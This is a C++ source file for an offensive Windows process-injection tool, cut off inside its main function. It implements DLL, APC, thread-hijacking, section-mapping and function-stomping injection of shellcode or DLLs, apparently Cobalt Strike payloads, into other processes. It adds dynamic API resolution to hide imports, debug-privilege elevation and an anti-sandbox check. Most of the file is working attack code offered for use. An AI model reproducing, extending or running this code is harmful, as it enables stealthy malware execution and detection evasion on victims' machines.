#include<iostream>
#include<tchar.h>
#include<string>
#include<Windows.h>
#include<memoryapi.h>
#include<Tlhelp32.h>
#include  "def.h"
#pragma comment(lib, "onecore.lib")
using namespace std;

typedef struct Initialization
{
	Fn_VirtualProtectEx			Hide_VirtualProtectEx;
	Fn_CreateFileMappingW		Hide_CreateFileMappingW;
	Fn_ResumeThread				Hide_ResumeThread;
	Fn_SetThreadContext         Hide_SetThreadContext;
	Fn_GetThreadContext			Hide_GetThreadContext;
	Fn_SuspendThread			Hide_SuspendThread;
	Fn_CreateToolhelp32Snapshot Hide_CreateToolhelp32Snapshot;
	Fn_OpenThread				Hide_OpenThread;
	FN_CreateRemoteThread		Hide_CreateRemoteThread;
	Fn_ReadFile					Hide_ReadFile;
	Fn_GetFileSize				Hide_GetFileSize;
	Fn_CreateFileW				Hide_CreateFileW;
	Fn_OpenProcess				Hide_OpenProcess;
	Fn_QueueUserAPC				Hide_QueueUserAPC;
	Fn_VirtualAllocEx           Hide_VirtualAllocEx;
	Fn_WriteProcessMemory		Hide_WriteProcessMemory;
	Fn_MapViewOfFile            Hide_MapViewOfFile;
	Fn_WaitForSingleObject      Hide_WaitForSingleObject;
	Fn_LoadLibraryW				Hide_LoadLibraryW;
}Initialization;

Initialization func = { 0 };

BOOL Win32()
{
	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	func.Hide_VirtualProtectEx = (Fn_VirtualProtectEx)GetProcAddress(hKernel32, "VirtualProtectEx");
	func.Hide_WaitForSingleObject = (Fn_WaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");
	func.Hide_CreateFileMappingW = (Fn_CreateFileMappingW)GetProcAddress(hKernel32, "CreateFileMappingW");
	func.Hide_ResumeThread = (Fn_ResumeThread)GetProcAddress(hKernel32, "ResumeThread");
	func.Hide_SetThreadContext = (Fn_SetThreadContext)GetProcAddress(hKernel32, "SetThreadContext");
	func.Hide_GetThreadContext = (Fn_GetThreadContext)GetProcAddress(hKernel32, "GetThreadContext");
	func.Hide_SuspendThread = (Fn_SuspendThread)GetProcAddress(hKernel32, "SuspendThread");
	func.Hide_CreateToolhelp32Snapshot = (Fn_CreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
	func.Hide_OpenThread = (Fn_OpenThread)GetProcAddress(hKernel32, "OpenThread");
	func.Hide_CreateRemoteThread = (FN_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
	func.Hide_ReadFile = (Fn_ReadFile)GetProcAddress(hKernel32, "ReadFile");
	func.Hide_GetFileSize = (Fn_GetFileSize)GetProcAddress(hKernel32, "GetFileSize");
	func.Hide_CreateFileW = (Fn_CreateFileW)GetProcAddress(hKernel32, "CreateFileW");
	func.Hide_OpenProcess = (Fn_OpenProcess)GetProcAddress(hKernel32, "OpenProcess");
	func.Hide_QueueUserAPC = (Fn_QueueUserAPC)GetProcAddress(hKernel32, "QueueUserAPC");
	func.Hide_VirtualAllocEx = (Fn_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
	func.Hide_WriteProcessMemory = (Fn_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
	func.Hide_MapViewOfFile = (Fn_MapViewOfFile)GetProcAddress(hKernel32, "MapViewOfFile");
	func.Hide_LoadLibraryW = (Fn_LoadLibraryW)GetProcAddress(hKernel32, "LoadLibraryW");
	if (func.Hide_CreateFileMappingW && func.Hide_CreateFileW && func.Hide_CreateRemoteThread && func.Hide_CreateToolhelp32Snapshot
		&& func.Hide_GetFileSize && func.Hide_GetThreadContext && func.Hide_MapViewOfFile
		&& func.Hide_OpenProcess && func.Hide_OpenThread && func.Hide_QueueUserAPC && func.Hide_ReadFile
		&& func.Hide_ResumeThread && func.Hide_SetThreadContext && func.Hide_SuspendThread && func.Hide_VirtualAllocEx
		&& func.Hide_WaitForSingleObject && func.Hide_WriteProcessMemory && func.Hide_LoadLibraryW && func.Hide_VirtualProtectEx)
		return TRUE;
	else
		return FALSE;
}


WCHAR* CharToWchar(char* str)
{
	int charLength = (int)(strlen(str) + 1); // +1 for null terminator
	int wcharLength = MultiByteToWideChar(CP_ACP, 0, str, charLength, NULL, 0);
	wchar_t* wcharString = (wchar_t*)calloc(wcharLength * sizeof(wchar_t), 2);
	MultiByteToWideChar(CP_ACP, 0, str, charLength, wcharString, wcharLength);
	return wcharString;
}

BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOk;
}

DWORD GetProcessPID(LPCTSTR lpProcessName)
{
	DWORD Ret = 0;
	PROCESSENTRY32 p32;
	HANDLE lpSnapshot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (lpSnapshot == INVALID_HANDLE_VALUE)
	{
		return Ret;
	}
	p32.dwSize = sizeof(PROCESSENTRY32);
	::Process32First(lpSnapshot, &p32);
	do {
		if (!lstrcmp(p32.szExeFile, lpProcessName))
		{
			Ret = p32.th32ProcessID;
			break;
		}
	} while (::Process32Next(lpSnapshot, &p32));
	::CloseHandle(lpSnapshot);
	return Ret;
}

void APCInject(DWORD pid, LPCWSTR dllpath)
{
	//1.获取句柄
	HANDLE TargetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
	if (TargetHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}

	//2.远程申请内存
	DWORD length = (wcslen(dllpath) + 2) * sizeof(TCHAR);
	PVOID RemoteMemory = func.Hide_VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (RemoteMemory == NULL)
	{
		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}
	//3.将上线的DLL的路径写入内存

	BOOL WriteStatus = func.Hide_WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}

	FARPROC LoadLibraryAddress = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
	if (LoadLibraryAddress == NULL)
	{
		cout << "	[-] Get LoadLibrary's Address Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Get LoadLibrary's Address Successfully :)" << endl;
	}

	HANDLE SnapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (SnapShot == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Taking Thread Snap Shot Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Taking Thread Snap Shot Successfully :)" << endl;
	}

	THREADENTRY32 te = { 0 };
	te.dwSize = sizeof(te);

	int flag = 0;
	HANDLE ThreadHandle = NULL;
	if (Thread32First(SnapShot, &te))
	{

		if (te.th32OwnerProcessID == pid)
		{
			ThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
			if (ThreadHandle)
			{
				DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
				if (dwRet == TRUE)
				{
					flag++;
				}
			}
			ThreadHandle = NULL;
		}

		while (Thread32Next(SnapShot, &te))
		{
			if (te.th32OwnerProcessID == pid)
			{
				ThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
				if (ThreadHandle)
				{
					DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
					if (dwRet == TRUE)
					{
						flag++;
					}
				}
				ThreadHandle = NULL;
			}
		}
		CloseHandle(TargetHandle);
		CloseHandle(SnapShot);
		CloseHandle(ThreadHandle);
		if (flag == 0)
		{
			cout << "	[-] APC Inject Failed :(" << endl;
			return;
		}
		else
		{
			cout << "	[+] APC Inj&ct Successfully !! Enj0y Hacking Time :) !" << endl;
		}
	}
}

void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
{
	unsigned char* tempbuffer = NULL;
	DWORD          fileLength = 0;
	HANDLE         fileHandle = NULL;
	fileHandle = func.Hide_CreateFileW(binPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	fileLength = func.Hide_GetFileSize(fileHandle, NULL);

	tempbuffer = (unsigned char*)malloc(fileLength);
	func.Hide_ReadFile(fileHandle, tempbuffer, fileLength, NULL, NULL);

	DWORD resumeCount = 0;
	DWORD suspendCount = 0;
	HANDLE targetProcessHandle;
	unsigned char* remoteShellCodeBuffer;
	HANDLE targetThreadHandle = NULL;
	HANDLE snapShot;
	THREADENTRY32 t32;
	CONTEXT ThreadCtx;
	ThreadCtx.ContextFlags = CONTEXT_FULL;
	t32.dwSize = sizeof(THREADENTRY32);

	targetProcessHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	remoteShellCodeBuffer = (unsigned char*)func.Hide_VirtualAllocEx(targetProcessHandle, NULL, sizeof(tempbuffer), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	func.Hide_WriteProcessMemory(targetProcessHandle, remoteShellCodeBuffer, tempbuffer, fileLength, NULL);

	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapShot, &t32);

	while (Thread32Next(snapShot, &t32))
	{
		if (t32.th32OwnerProcessID == targetPID)
		{
			targetThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, t32.th32ThreadID);
			break;
		}
	}
	func.Hide_SuspendThread(targetThreadHandle);
	if (suspendCount == (DWORD)-1)
	{
		cout << "	[-]Suspend Target Thread Failed :(" << endl;
		goto end;
	}
	else
	{
		cout << "	[+] Suspend Target Thread Successfully :)" << endl;
	}
	if (!func.Hide_GetThreadContext(targetThreadHandle, &ThreadCtx))
	{
		cout << "	[-]Get Target Thread Context Failed :(" << endl;
		goto end;
	}
	else
	{
		cout << "	[+] Get Target Thread Successfully :)" << endl;
	}
	ThreadCtx.Rip = (DWORD_PTR)remoteShellCodeBuffer;
	if (!func.Hide_SetThreadContext(targetThreadHandle, &ThreadCtx))
	{
		cout << "	[-]Set Target Thread Context Failed :(";
		goto end;
	}
	else
	{
		cout << "	[+] Set Target Thread Context Successfully :)" << endl;
	}
	resumeCount = func.Hide_ResumeThread(targetThreadHandle);
	if (resumeCount == (DWORD)-1) {
		cout << "	[-] Resume Target Thread Failed :(" << endl;
	}
	else
	{
		cout << "	[+] Resume Target Thread Successfully :)" << endl;
	}
	cout << "	[+] Remote Thread HiJa&king Successfully ! Enj0y Hacking Time :)" << endl;
end:
	CloseHandle(snapShot);
	CloseHandle(targetProcessHandle);
	CloseHandle(targetThreadHandle);
}

BOOL TraverseProcess(LPCWSTR ProcessName)
{
	int cnt = 0;
	HANDLE snapShot;
	PROCESSENTRY32 p32 = { 0 };
	p32.dwSize = sizeof(PROCESSENTRY32);

	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	Process32First(snapShot, &p32);

	cout << "	[+] Below Are The Process PID :) " << endl;
	do {

		if (!lstrcmp(p32.szExeFile, (LPCWSTR)ProcessName)) {
			cnt++;
			cout << p32.th32ProcessID << endl;
		}
	} while (Process32Next(snapShot, &p32));

	if (cnt == 0)
	{
		cout << "	[-] Process PID Not Found :(" << endl;
		return FALSE;
	}
	cout << "	[+] Which Thread's PID Do You Wanna HiJack :)" << endl;
	cout << "	[!] This May Cause Process Collapse , Watch Out [!]" << endl;

	return TRUE;
}
void FunctionStomping(LPCWSTR targetName, LPCWSTR binFile)
{
	char		dllName[MAX_PATH];
	char		functionName[MAX_PATH];
	SIZE_T      realLength = 0;
	DWORD		fileSize = 0;
	DWORD		targetProcessPID = 0;
	HANDLE      targetHandle = INVALID_HANDLE_VALUE;
	HANDLE      fileHandle = INVALID_HANDLE_VALUE;
	HANDLE      hProcess = INVALID_HANDLE_VALUE;
	PVOID       stompAddress = NULL;
	PVOID       fileBuffer = NULL;

	cout << "	[!] Which Dll's Function Do You Wanna Stomping" << endl;
	cin >> dllName >> functionName;
	WCHAR* convertName = CharToWchar(dllName);

	targetProcessPID = GetProcessPID(targetName);
	if (targetProcessPID == 0)
	{
		cout << "	[-] Get Target ProcessPID Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Get Target ProcessPID Successfully" << endl;

	fileHandle = func.Hide_CreateFileW(binFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (fileHandle == INVALID_HANDLE_VALUE)
		goto END;
	fileSize = func.Hide_GetFileSize(fileHandle, NULL);
	if (fileSize == 0)
		goto END;
	fileBuffer = malloc(fileSize);
	if (fileBuffer == NULL)
		goto END;
	if (!func.Hide_ReadFile(fileHandle, fileBuffer, fileSize, NULL, NULL))
		goto END;
	cout << "	[+] Read Bin File Into Memory Successfully :)" << endl;

	func.Hide_LoadLibraryW(convertName);
	stompAddress = GetProcAddress(GetModuleHandleW(convertName), functionName);
	if (stompAddress == NULL)
	{
		cout << "	[-] Get Stomp Address Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Get Stomp Address Successfully :)" << endl;

	targetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessPID);
	if (targetHandle == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Open Target Process Failed :( " << endl;
		goto END;
	}
	else
		cout << "	[+] Open Target Process Successfully :)" << endl;

	func.Hide_VirtualProtectEx(targetHandle, stompAddress, fileSize, PAGE_READWRITE, NULL);

	if (!WriteProcessMemory(targetHandle, stompAddress, fileBuffer, fileSize, &realLength))
	{
		cout << "	[-] Write Process Memory Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Write Process Memroy Successfully :)" << endl;

	func.Hide_VirtualProtectEx(targetHandle, stompAddress, fileSize, PAGE_EXECUTE_READWRITE, NULL);

	hProcess = func.Hide_CreateRemoteThread(targetHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)stompAddress, NULL, NULL, NULL);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Create Remote Thread Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Create Remote Thread Successfully :)" << endl;

	cout << "	[+] Function St&mping Successfully !! Enj0y Hacking Time :) !" << endl;
	CloseHandle(hProcess);
	CloseHandle(targetHandle);
	CloseHandle(fileHandle);
END:
	CloseHandle(hProcess);
	CloseHandle(targetHandle);
	CloseHandle(fileHandle);
}

void MappingInject(LPCWSTR targetProcess, LPCWSTR binFile)
{
	DWORD    fileSize = 0;
	PVOID    fileBuffer = NULL;
	PVOID    pMapAddress = NULL;
	PVOID    remoteMemory = NULL;
	HANDLE   targetHandle = INVALID_HANDLE_VALUE;
	HANDLE   fileHandle = INVALID_HANDLE_VALUE;
	HANDLE   tempHandle = INVALID_HANDLE_VALUE;
	HANDLE   mapAddressHandle = INVALID_HANDLE_VALUE;
	HANDLE   hProcess = INVALID_HANDLE_VALUE;

	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);

	typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
	if (ZwCreateThreadEx == NULL)
	{
		cout << "	[-] Get ZwCreateThreadEx Address Failed :(" << endl;
		goto END;
	}
	else {
		cout << "	[+] Get ZwCreateThreadEx Address Successfully :)" << endl;
	}

	fileHandle = func.Hide_CreateFileW(binFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (fileHandle == INVALID_HANDLE_VALUE)
		goto END;
	fileSize = func.Hide_GetFileSize(fileHandle, NULL);
	if (fileSize == 0)
		goto END;
	fileBuffer = malloc(fileSize);
	if (fileBuffer == NULL)
		goto END;
	if (!func.Hide_ReadFile(fileHandle, fileBuffer, fileSize, NULL, NULL))
		goto END;
	cout << "	[+] Read Bin File Into Memory Successfully :)" << endl;

	tempHandle = func.Hide_CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, fileSize, NULL);
	if (tempHandle == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Create Mapping Object Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Create Mapping Object Successfully :)" << endl;

	pMapAddress = func.Hide_MapViewOfFile(tempHandle, FILE_MAP_WRITE, 0, 0, fileSize);

	if (pMapAddress == NULL)
	{
		cout << "	[-] Mapping Into Temp Memory Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Mapping Into Temp Memory Successfully :)" << endl;


	memcpy(pMapAddress, fileBuffer, fileSize);

	targetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessPID(targetProcess));
	if (targetHandle == INVALID_HANDLE_VALUE || GetLastError() == 87)
	{
		cout << "	[-] Get Target Handle Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Get Target Handle Successfully :)" << endl;


	remoteMemory = MapViewOfFile2(tempHandle, targetHandle, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (remoteMemory == NULL)
	{
		cout << "	[-] Mapping Into Remote Memory Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Mapping Into Remote Memory Successfully :)" << endl;

	//hProcess = CreateRemoteThread(targetHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
	if (ZwCreateThreadEx(&hProcess, PROCESS_ALL_ACCESS, NULL, targetHandle, (LPTHREAD_START_ROUTINE)remoteMemory, 0, 0, 0, 0, 0, NULL))
	{
		cout << "	[-] Create Remote Thread Failed :(" << endl;
		goto END;
	}
	else
		cout << "	[+] Create Remote Thread Successfully :)" << endl;

	CloseHandle(targetHandle);
	CloseHandle(fileHandle);
	CloseHandle(tempHandle);
	CloseHandle(mapAddressHandle);
	UnmapViewOfFile(tempHandle);
	return;
END:
	UnmapViewOfFile(tempHandle);
	CloseHandle(targetHandle);
	CloseHandle(fileHandle);
	CloseHandle(tempHandle);
	CloseHandle(mapAddressHandle);
}

void DLLInject(DWORD pid, LPCWSTR dllpath)
{
	HANDLE OriginalProcessHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (OriginalProcessHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;

		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}

	DWORD  length = (wcslen(dllpath) + 1) * sizeof(TCHAR);

	PVOID  RemoteMemory = func.Hide_VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);

	if (RemoteMemory == NULL)
	{

		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}

	BOOL WriteStatus = func.Hide_WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}


	FARPROC LoadLibraryHandle = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);

	typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
	if (ZwCreateThreadEx == NULL)
	{
		cout << "	[-] Get ZwCreateThreadEx Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] Get ZwCreateThreadEx Address Successfully :)" << endl;
	}
	HANDLE hRemoteThread;
	DWORD Status = 0;
	Status = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, OriginalProcessHandle, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, 0, 0, 0, NULL);
	if (Status == NULL)
	{
		cout << "	[+] Ring0 Thread Inject Successfully :)" << endl;
	}
	else
	{
		cout << "	[-] Ring0 Thread Inject Failed :(" << endl;
		return;
	}

	CloseHandle(OriginalProcessHandle);
	CloseHandle(ZwCreateThreadEx);
	cout << "	[+] DLL inj&ct successfu11y !! Enj0y Hacking Time :) !" << endl;
}

void Banner(int type)
{
	if (type == 1)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
		std::cout << "________  .____    .____      .___            __               __   \n"
			"\\______ \\ |    |   |    |     |   | ____     |__| ____   _____/  |_ \n"
			" |    |  \\|    |   |    |     |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n"
			" |    `   \\    |___|    |___  |   |   |  \\   |  \\  ___/\\  \\___|  |  \n"
			"/_______  /_______ \\_______ \\ |___|___|  /\\__|  |\\___  >\\___  >__|  \n"
			"        \\/        \\/       \\/          \\/\\______|    \\/     \\/      \n";

		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	else if (type == 2)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		std::cout << "   _____ ___________________   .___            __               __   \n"
			"  /  _  \\\\______   \\_   ___ \\  |   | ____     |__| ____   _____/  |_ \n"
			" /  /_\\  \\|     ___/    \\  \\/  |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n"
			"/    |    \\    |   \\     \\____ |   |   |  \\   |  \\  ___/\\  \\___|  |  \n"
			"\\____|__  /____|    \\______  / |___|___|  /\\__|  |\\___  >\\___  >__|  \n"
			"        \\/                 \\/           \\/\\______|    \\/     \\/      \n";

		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	else if (type == 3)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
		std::cout << "                              __________                       __                                                \n"
			"                              \\______   \\ ____   _____   _____/  |_  ____                                       \n"
			"                               |       _// __ \\ /     \\ /  _ \\   __\\/ __ \\                                      \n"
			"                               |    |   \\  ___/|  Y Y  (  <_> )  | \\  ___/                                      \n"
			"                               |____|_  /\\___  >__|_|  /\\____/|__|  \\___  >                                     \n"
			"                                      \\/     \\/      \\/                 \\/                                      \n"
			"__________.__                              .___   ___ ___ .__     ____.              __   .__.__                \n"
			"\\______   \\  |_________   ____ _____     __| _/  /   |   \\|__|   |    |____    ____ |  | _|__|__| ____    ____  \n"
			" |       _/  |  \\_  __ \\_/ __ \\\\__  \\   / __ |  /    ~    \\  |   |    \\__  \\ _/ ___\\|  |/ /  |  |/    \\  / ___\\ \n"
			" |    |   \\   Y  \\  | \\/\\  ___/ / __ \\_/ /_/ |  \\    Y    /  /\\__|    |/ __ \\  \\___|    <|  |  |   |  \\/ /_/  >\n"
			" |____|_  /___|  /__|    \\___  >____  /\\____ |   \\___|_  /|__\\________(____  /\\___  >__|_ \\__|__|___|  /\\___  / \n"
			"        \\/     \\/            \\/     \\/      \\/         \\/                  \\/     \\/     \\/          \\/ /_____/\n";

		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	else if (type == 4)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
		std::cout << "    _____                       .__                 .___            __               __   \n";
		std::cout << "  /     \\ _____  ______ ______ |__| ____    ____   |   | ____     |__| ____   _____/  |_\n";
		std::cout << " /  \\ /  \\\\__  \\ \\____ \\\\____ \\|  |/    \\  / ___\\  |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n";
		std::cout << "/    Y    \\/ __ \\|  |_> >  |_> >  |   |  \\/ /_/  > |   |   |  \\   |  \\  ___/\\  \\___|  |  \n";
		std::cout << "\\____|__  (____  /   __/|   __/|__|___|  /\\___  /  |___|___|  /\\__|  |\\___  >\\___  >__|  \n";
		std::cout << "        \\/     \\/|__|   |__|           \\/     \\/            \\/\\______|    \\/     \\/       \n";
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	else if (type == 5)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN);
		std::cout << R"(
 ___________                   __  .__                  _________ __                        .__                
 \_   _____/_ __  ____   _____/  |_|__| ____   ____    /   _____//  |_  ____   _____ ______ |__| ____    ____  
  |    __)|  |  \/    \_/ ___\   __\  |/  _ \ /    \   \_____  \\   __\/  _ \ /     \\____ \|  |/    \  / ___\ 
  |     \ |  |  /   |  \  \___|  | |  (  <_> )   |  \  /        \|  | (  <_> )  Y Y  \  |_> >  |   |  \/ /_/  >
  \___  / |____/|___|  /\___  >__| |__|\____/|___|  / /_______  /|__|  \____/|__|_|  /   __/|__|___|  /\___  / 
      \/             \/     \/                    \/          \/                   \/|__|           \//_____/
)" << std::endl;
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
	if (EnableDebugPrivilege() == TRUE)
	{

		cout << "-----------------------------!!START!!--------------------------------" << endl;
		cout << "	[+] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
	}
	else {
		cout << "-----------------------------!!START!!--------------------------------" << endl;
		cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
	}

}
BOOL AntiSandBox()
{
	DWORD Ret = 0;
	PROCESSENTRY32 p32;
	HANDLE lpSnapshot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (lpSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("	[-] 获取进程快照失败,请重试! Error:%d", ::GetLastError());
		return Ret;
	}
	p32.dwSize = sizeof(PROCESSENTRY32);
	::Process32First(lpSnapshot, &p32);
	int cnt = 1;
	int checkWechatExit = 0;
	do {
		cnt++;
		std::wstring processName(p32.szExeFile);
		if (processName == L"WeChat.exe")
		{
			checkWechatExit = 1;
		}
	} while (Process32Next(lpSnapshot, &p32));

	if (checkWechatExit == 0)
	{
		return 0;
	}
	else
	{
		return cnt > 100;
	}
}

void TrashData()
{
	int* data = (int*)malloc(70000 * sizeof(int));
	for (int i = 0; i < 70000; i++)
	{
		data[i] = i;

	}
	for (int i = 0; i < 70000; i++)
	{
		printf("%d", data[i]);
	}
	std::cout << "\033[2J\033[1;1H";
}

int _tmain(int argc, TCHAR* argv[])
{
	if (argc == 3) {

		cout << "	Which kind of Injection do you want?" << endl;
		cout << "	[1]: DLLInject" << endl << "	[2]: APCInject" << endl;
		cout << "	[3]: ThreadHiJacking" << endl << "	[4]: MappingInject" << endl;
		cout << "	[5]: FunctionStomping" << endl;
		int type = 0;
		cin >> type;
		Banner(type);
		if (Win32())
			cout << "	[+] Dynamic Call Successfully :)" << endl;
		else
		{
			TrashData();
			std::cout << "\033[2J\033[1;1H";
			cout << "	[-] Dynamic Call Failed :(" << endl;
			return 0;
		}
		if (AntiSandBox())
			cout << "	[+] Anti SandBox Successfully :)" << endl;
		else
